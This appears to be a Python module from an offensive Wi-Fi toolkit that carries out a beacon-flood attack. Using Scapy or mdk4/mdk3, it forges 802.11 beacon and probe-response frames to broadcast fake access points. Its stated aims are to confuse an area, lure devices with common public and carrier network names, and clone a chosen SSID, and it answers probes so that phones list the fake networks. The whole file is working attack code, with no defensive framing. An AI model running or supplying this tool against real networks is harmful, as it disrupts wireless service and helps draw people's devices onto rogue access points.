# beacon_flood.py
"""
Beacon Flooding — Broadcast thousands of fake AP Beacons.
Uses cases:
  1. Flood area with fake SSIDs to cause confusion
  2. Broadcast common saved-network names to attract devices (pre-Karma)
  3. Clone a specific SSID multiple times on different channels
"""
import os
import sys
import time
import random
import string
import shutil
import tempfile
import threading
import subprocess
from typing import List, Optional

try:
    from scapy.all import (
        sendp, sniff, RadioTap, Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt
    )
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

from wifi_nightmare.config import C_GREEN, C_RED, C_YELLOW, C_CYAN, C_WHITE, C_GREY, C_RESET
from wifi_nightmare.logger import logger

COMMON_SSIDS = [
    "Free WiFi", "FreeWifi", "WiFi", "Internet", "Guest",
    "Home", "Starbucks WiFi", "McDonalds Free WiFi", "Airport WiFi",
    "Hotel WiFi", "Public WiFi", "AndroidAP", "iPhone Hotspot",
    "TP-Link", "NETGEAR", "dlink", "Linksys", "ASUS",
    "ZainWifi", "OrangeWifi", "EtisalatWifi", "VodafoneWifi", "WE_Fiber",
    "Vodafone-4G", "Orange-5G", "TE-Data",
]


def _random_mac() -> str:
    """Generate a random locally administered MAC."""
    b = [random.randint(0, 255) for _ in range(6)]
    b[0] = (b[0] & 0xfc) | 0x02
    return ':'.join(f'{x:02x}' for x in b)


def _build_beacon(ssid: str, bssid: str, channel: int, hidden: bool = False) -> object:
    """Build a compliant 802.11 Beacon frame."""
    ssid_info = b'' if hidden else ssid.encode('utf-8', errors='ignore')[:32]
    frame = (
        RadioTap() /
        Dot11(type=0, subtype=8,
              addr1='ff:ff:ff:ff:ff:ff',
              addr2=bssid,
              addr3=bssid) /
        Dot11Beacon(cap=0x0431) /
        Dot11Elt(ID='SSID', info=ssid_info) /
        Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
        Dot11Elt(ID='DSset', info=bytes([channel & 0xFF])) /
        Dot11Elt(ID=48,
            info=(
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x02'
                b'\x00\x00'
            )
        )
    )
    return frame


def _build_probe_response(ssid: str, bssid: str, channel: int, client_mac: str) -> object:
    """Build a matching Probe Response frame so active scanners display the AP."""
    frame = (
        RadioTap() /
        Dot11(type=0, subtype=5,
              addr1=client_mac,
              addr2=bssid,
              addr3=bssid) /
        Dot11ProbeResp(
            timestamp=int(time.time() * 1_000_000),
            beacon_interval=100,
            cap=0x0431
        ) /
        Dot11Elt(ID='SSID', info=ssid.encode('utf-8', errors='ignore')[:32]) /
        Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24') /
        Dot11Elt(ID='DSset', info=bytes([channel & 0xFF])) /
        Dot11Elt(ID=48,
            info=(
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x04'
                b'\x01\x00'
                b'\x00\x0f\xac\x02'
                b'\x00\x00'
            )
        )
    )
    return frame


class BeaconFlood:
    """
    Beacon Flood Attack.
    Prioritizes kernel-level mdk4/mdk3 for hardware line rate and active probe response.
    Falls back to high-throughput batched Scapy with persistent BSSID sequences.
    """

    def __init__(self, interface: str, mode: str = 'common',
                 ssid: str = None, custom_ssids: List[str] = None,
                 channel: int = 6, rate: float = 0.01,
                 count: int = 0, force_scapy: bool = False):
        self.interface = interface
        self.mode = mode
        self.ssid = ssid
        self.custom_ssids = custom_ssids or []
        self.channel = channel
        self.rate = rate
        self.count = count
        self.force_scapy = force_scapy
        self.stop_event = threading.Event()
        self._sent = 0
        self._proc: Optional[subprocess.Popen] = None

    def _get_ssid_list(self) -> List[str]:
        if self.mode == 'common':
            return COMMON_SSIDS
        elif self.mode == 'clone':
            return [self.ssid] * 40 if self.ssid else COMMON_SSIDS
        elif self.mode == 'random':
            return [''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(6, 12)))
                    for _ in range(40)]
        elif self.mode == 'custom':
            return self.custom_ssids or COMMON_SSIDS
        return COMMON_SSIDS

    def _set_channel(self):
        """Ensure physical wireless interface is locked to the target channel."""
        try:
            subprocess.run(["iw", "dev", self.interface, "set", "channel", str(self.channel)],
                           capture_output=True, timeout=2)
        except Exception:
            try:
                subprocess.run(["iwconfig", self.interface, "channel", str(self.channel)],
                               capture_output=True, timeout=2)
            except Exception:
                pass

    def _run_native_mdk(self, tool: str, ssid_list: List[str]) -> bool:
        """Run beacon flooding via native kernel utility (mdk4 / mdk3)."""
        self._set_channel()
        temp_file = None
        cmd = [tool, self.interface, "b"]

        if self.mode == 'clone' and self.ssid:
            cmd.extend(["-n", self.ssid])
        else:
            fd, temp_file = tempfile.mkstemp(prefix="beacon_flood_", suffix=".txt")
            with os.fdopen(fd, 'w', encoding='utf-8') as f:
                for s in ssid_list:
                    f.write(f"{s}\n")
            cmd.extend(["-f", temp_file])

        # NOTE: do NOT add "-a" here. In mdk4 (4.x), beacon-mode -a means
        # "generate SSIDs with non-printable chars / break the 32-byte limit",
        # and it is MUTUALLY EXCLUSIVE with -n / -f / -v (mdk4 aborts with
        # "Only one of -n -a -f or -v may be selected" and exit code 1).
        # Since we always pass -n (clone) or -f (list), -a made mdk4 fail
        # instantly every time, silently dropping us to the weak Scapy engine.
        cmd.extend(["-c", str(self.channel), "-s", "100"])

        print(f"\n{C_CYAN}[*] Beacon Flood ACTIVE ({tool.upper()} Line-Rate Engine) | Mode: {self.mode.upper()}{C_RESET}")
        print(f"{C_YELLOW}[*] Hardware Channel: {self.channel} | SSIDs: {len(ssid_list)} | Ctrl+C to stop{C_RESET}")
        if self.mode == 'clone' and self.ssid:
            print(f"{C_GREEN}[*] Broadcasting multiple persistent clones of: '{self.ssid}'{C_RESET}")

        start = time.time()
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            while not self.stop_event.is_set():
                if self._proc.poll() is not None:
                    break
                elapsed = time.time() - start
                sys.stdout.write(f"\r{C_GREEN}[+] [{tool.upper()}] Transmitting beacons... | {elapsed:.1f}s active | Channel {self.channel}{C_RESET}   ")
                sys.stdout.flush()
                time.sleep(0.5)

        except Exception as e:
            logger.error(f"{tool} execution error: {e}")
            return False
        finally:
            if self._proc and self._proc.poll() is None:
                try:
                    self._proc.terminate()
                    self._proc.wait(timeout=1.0)
                except Exception:
                    try:
                        self._proc.kill()
                    except Exception:
                        pass
            if temp_file and os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except Exception:
                    pass

        # A tool that exits almost instantly with a non-zero code never
        # actually started flooding (bad args, interface not ready for TX,
        # missing permission). Report that as a failure so run() falls back
        # to the Scapy engine instead of silently claiming "stopped" on an
        # attack that never ran even once.
        exit_code = self._proc.returncode if self._proc else None
        died_instantly = (time.time() - start) < 2.0
        if died_instantly and exit_code not in (None, 0):
            print(f"\n{C_RED}[!] {tool} exited immediately (code {exit_code}) without starting — falling back to Scapy engine.{C_RESET}")
            logger.warning(f"{tool} failed to start (exit {exit_code}); falling back to scapy beacon flood engine")
            return False

        print(f"\n{C_GREEN}[+] Beacon Flood stopped.{C_RESET}")
        return True

    def _run_scapy(self, ssid_list: List[str]):
        """Batched Scapy beacon flood with persistent BSSIDs and active probe response."""
        self._set_channel()
        print(f"\n{C_CYAN}[*] Beacon Flood ACTIVE (Scapy Batched Engine) | Mode: {self.mode.upper()} | {len(ssid_list)} SSIDs{C_RESET}")
        print(f"{C_YELLOW}[*] Hardware Channel: {self.channel} | Ctrl+C to stop{C_RESET}")

        # CRITICAL: Create persistent, fixed BSSID mapping.
        # Repeating identical BSSIDs allows smartphones to register and display networks!
        bssid_pool = [_random_mac() for _ in range(len(ssid_list))]
        network_map = dict(zip(bssid_pool, ssid_list))

        # Pre-build frames for zero-allocation transmission loop
        frames = []
        for bssid, ssid in network_map.items():
            frames.append(_build_beacon(ssid, bssid, self.channel))

        # Start a background Probe Response thread to answer client active scanning
        def _probe_responder():
            def _handle_probe(pkt):
                if self.stop_event.is_set():
                    return
                if not pkt.haslayer(Dot11ProbeReq):
                    return
                client_mac = pkt[Dot11].addr2
                if not client_mac or client_mac == "ff:ff:ff:ff:ff:ff":
                    return

                req_ssid = ""
                if pkt.haslayer(Dot11Elt):
                    elt = pkt[Dot11Elt]
                    while elt:
                        if elt.ID == 0:
                            try:
                                req_ssid = elt.info.decode('utf-8', errors='ignore').strip('\x00')
                            except Exception:
                                req_ssid = ""
                            break
                        elt = elt.payload if hasattr(elt, 'payload') else None

                # Reply if wildcard probe or matches any of our flood SSIDs
                for bssid, ssid in network_map.items():
                    if not req_ssid or req_ssid == ssid:
                        try:
                            resp = _build_probe_response(ssid, bssid, self.channel, client_mac)
                            sendp(resp, iface=self.interface, verbose=0)
                        except Exception:
                            pass
                        break

            try:
                sniff(iface=self.interface, prn=_handle_probe, store=0, timeout=1,
                      stop_filter=lambda p: self.stop_event.is_set())
            except Exception:
                pass

        probe_thread = threading.Thread(target=_probe_responder, daemon=True)
        probe_thread.start()

        start = time.time()
        while not self.stop_event.is_set():
            if self.count > 0 and self._sent >= self.count:
                break

            try:
                # Transmit the entire burst of persistent beacons in one batch
                sendp(frames, iface=self.interface, verbose=0)
                self._sent += len(frames)
            except Exception as e:
                logger.debug(f"Beacon burst send error: {e}")

            elapsed = time.time() - start
            rate = self._sent / max(0.1, elapsed)
            sys.stdout.write(f"\r{C_YELLOW}[*] Sent: {self._sent} beacons | {rate:.0f} pkt/s | {elapsed:.1f}s | Channels active: {self.channel}{C_RESET}   ")
            sys.stdout.flush()

            time.sleep(max(0.01, self.rate))

        print(f"\n{C_GREEN}[+] Beacon Flood finished. Total sent: {self._sent}{C_RESET}")

    def run(self):
        ssid_list = self._get_ssid_list()

        # Check for mdk4 / mdk3 native tools first
        if not self.force_scapy:
            mdk_tool = shutil.which("mdk4") or shutil.which("mdk3")
            if mdk_tool:
                if self._run_native_mdk(mdk_tool, ssid_list):
                    return

        # Fallback to enhanced Scapy engine
        if not HAS_SCAPY:
            print(f"{C_RED}[!] Neither mdk4 nor Scapy available for Beacon Flood.{C_RESET}")
            return

        self._run_scapy(ssid_list)

    def stop(self):
        self.stop_event.set()
        if self._proc and self._proc.poll() is None:
            try:
                self._proc.terminate()
            except Exception:
                pass
